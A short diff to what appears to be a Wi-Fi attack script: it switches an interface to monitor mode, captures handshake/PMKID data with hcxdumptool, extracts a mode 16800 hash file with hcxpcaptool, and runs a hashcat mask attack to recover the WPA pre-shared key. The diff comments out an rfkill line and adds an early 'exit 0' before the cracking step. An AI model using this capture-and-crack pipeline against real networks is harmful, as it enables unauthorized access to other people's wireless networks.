@@ -58,7 +58,7 @@ my_interface=$(./bin/hcxdumptool -I | tail -n1 | cut -d" " -f2)
 # if it doesn't, this will fail, and everything else will too :(
 sudo ip link set $my_interface down
 sudo iw dev $my_interface set type monitor
-sudo rfkill unblock all
+#sudo rfkill unblock all
 sudo ip link set $my_interface up
 
 # clear existing pcap if found
@@ -73,6 +73,8 @@ cd out
 #sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
 sudo ../bin/hcxdumptool -o $timestamp.pcapng -i $my_interface --enable_status=1
 ../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z $timestamp.16800 $timestamp.pcapng
+
+exit 0
 
 echo "** using hashcat to try and get the WPA PSK **"
 ../bin/hashcat -m 16800 $timestamp.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
